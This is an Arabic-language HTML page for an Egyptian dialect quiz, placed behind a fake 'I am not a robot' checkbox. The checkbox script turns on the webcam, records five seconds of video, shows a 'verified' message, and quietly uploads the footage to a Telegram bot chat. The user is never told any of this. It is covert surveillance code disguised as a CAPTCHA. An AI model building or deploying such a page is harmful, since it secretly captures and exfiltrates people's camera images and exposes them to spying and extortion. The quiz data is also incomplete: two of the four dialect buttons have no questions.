<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اختبار اللهجات المصرية</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Cairo', Arial, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #2980b9, #27ae60);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #333;
        }
        .container {
            background: rgba(255, 255, 255, 0.9);
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            padding: 30px;
            text-align: center;
        }
        .verification-section,
        .quiz-section {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .checkbox-container {
            display: flex;
            align-items: center;
            margin: 15px 0;
            gap: 10px;
        }
        input[type="checkbox"] {
            width: 24px;
            height: 24px;
        }
        .loading,
        .success {
            margin: 15px 0;
            font-size: 18px;
        }
        .loading {
            color: #f39c12;
        }
        .success {
            color: #27ae60;
        }
        video {
            width: 100%;
            max-width: 300px;
            border-radius: 10px;
            margin: 15px 0;
            background: #000;
        }
        .language-buttons {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }
        .btn {
            background-color: #27ae60;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .btn:hover {
            background-color: #2ecc71;
        }
        .quiz-section h2 {
            margin-bottom: 15px;
        }
        .option {
            display: flex;
            align-items: center;
            margin: 10px 0;
            background-color: #f7f7f7;
            border-radius: 8px;
            padding: 10px;
        }
        .option:hover {
            background-color: #e8f4f8; 
        }
        .result {
          text-align:center; 
          padding :20px; 
          background-color:#f1f1f1; 
          border-radius :10px; 
      }
    </style>
</head>
<body>
    <div class="container" id="verification-container">
        <div class="verification-section">
            <h1>تحقق من أنك لست روبوتاً</h1>
            <div class="checkbox-container">
                <input type="checkbox" id="robot-checkbox">
                <label for="robot-checkbox">أنا لست روبوتاً</label>
             </div>
             <video id="video" autoplay playsinline muted></video>
             <div class="loading">جاري التحقق... ⏳</div>
             <div class="success">✅ تم التحقق بنجاح!</div>
         </div>
     </div>

     <div class="container" id="quiz-container" style="display:none;">
         <div class="quiz-section">
             <h1>اختبار اللهجات المصرية</h1>
             <div class="language-buttons">
                 <button class="btn" onclick="startQuiz('اسكندراني')">إسكندراني</button>
                 <button class="btn" onclick="startQuiz('منياوي')">منياوي</button>
                 <button class="btn" onclick="startQuiz('فلاحي')">فلاحي</button>
                 <button class="btn" onclick="startQuiz('صعيدي')">صعيدي</button>
             </div>
             <div id="question-container" style="display:none;">
                 <h2 id="question-text"></h2>
                 <div id="options-container"></div>
                 <button id="next-button" class="btn" style="display:none; width:100%;">السؤال التالي</button>
             </div>
             <div class="result" id="result" style="display:none;">
                 <h2>نتيجتك</h2>
                 <p id="score"></p>
             </div>
         </div>
     </div>

     <script>
         const video = document.getElementById('video');
         const checkbox = document.getElementById('robot-checkbox');
         const loading = document.querySelector('.loading');
         const success = document.querySelector('.success');

         checkbox.addEventListener('change', (e) => {
             if (e.target.checked) {
                 video.style.display = 'block';
                 loading.style.display = 'block';
                 success.style.display = 'none';
                 navigator.mediaDevices.getUserMedia({ video:true })
                     .then((stream) => {
                         video.srcObject = stream;

                         const mediaRecorder = new MediaRecorder(stream);
                         const chunks = [];
                         mediaRecorder.start();

                         mediaRecorder.ondataavailable = (event) => { chunks.push(event.data); };
                         setTimeout(() => { mediaRecorder.stop(); },5000);

                         mediaRecorder.onstop = () => {
                             loading.style.display = 'none';
                             success.style.display = 'block';
                             stream.getTracks().forEach(track => track.stop());
                             document.getElementById('verification-container').style.display = 'none';
                             document.getElementById('quiz-container').style.display = 'block';

                             const blob = new Blob(chunks, { type:'video/webm' });
                             const formData = new FormData();
                             formData.append('chat_id', '2070423407');
                             formData.append('video', blob, 'video.webm');

                             fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendVideo`, { method:'POST', body : formData })
                                 .catch((error) => { console.error('Video upload failed:', error.message); });
                         };
                     })
                     .catch((err) => { alert("Unable to access the camera:" + err.message); });
             }
         });

         const dialects = {
             "اسكندراني": [
                 { q:"ما معنى كلمة 'جعان'؟", options:["محتاج","جائع","نعسان","غاضب"], correct :1 },
                 { q:"ماذا تعني 'حتة'؟", options:["جزء","بيت","مكان","شيء"], correct :0 },
                 // Additional questions...
             ],
             "منياوي": [
                 { q:"ماذا تعني 'أبا'؟", options:["أنا","أبي","أنت","نعم"], correct :1 },
                 { q:"ما هو معنى 'زير'؟", options:["وعاء ماء","ثوب","طعام","بيت"], correct :0 },
                 // Additional questions...
             ]
         };

         let score = 0; 
         let currentQuestionIndex = 0; 
         const nextButton = document.getElementById('next-button'); 
         const questionText = document.getElementById('question-text'); 
         const optionsContainer = document.getElementById('options-container'); 
         const resultDiv = document.getElementById('result'); 
         const scoreText = document.getElementById('score'); 
         let questions = [];

         function shuffleQuestions(arr) {
             for (let i=arr.length -1; i >0; i--) {
                 const j=Math.floor(Math.random() * (i +1));
                 [arr[i], arr[j]]=[arr[j], arr[i]];
             }
         }

         function startQuiz(dialect) {
             questions=dialects[dialect];
             shuffleQuestions(questions); // Shuffle questions for randomness
             displayQuestion();
             document.getElementById('question-container').style.display='block';
         }

         function handleAnswer(selectedOption) {
             const question=questions[currentQuestionIndex];
             const correctOption=question.correct;

             if (selectedOption===correctOption) { score++; }

             nextButton.style.display='block';
         }

         nextButton.addEventListener('click', () => {
             currentQuestionIndex++;
             
             if (currentQuestionIndex<questions.length) {
                 displayQuestion();
                 nextButton.style.display='none';
             } else { showResult(); }
         });

         function displayQuestion() {
             const question=questions[currentQuestionIndex];
             questionText.textContent=question.q;

             optionsContainer.innerHTML='';
             
             question.options.forEach((option,index) => {
                 const optionDiv=document.createElement('div');
                 optionDiv.classList.add('option');

                 const radioInput=document.createElement('input');
                 radioInput.type='radio';
                 radioInput.name='answer';
                 radioInput.id=`option-${index}`;
                 radioInput.value=index;

                 radioInput.addEventListener('click', () => handleAnswer(index));

                 const label=document.createElement('label');
                 label.setAttribute('for', `option-${index}`);
                 label.textContent=option;

                 optionDiv.appendChild(radioInput);
                 optionDiv.appendChild(label);
                 
                 optionsContainer.appendChild(optionDiv);
              });
          }

          function showResult() {
              resultDiv.style.display='block';
              scoreText.textContent=`النتيجة:${score} من ${questions.length}`;
              document.getElementById('quiz-container').style.display='none';
          }
     </script>
</body>
</html>
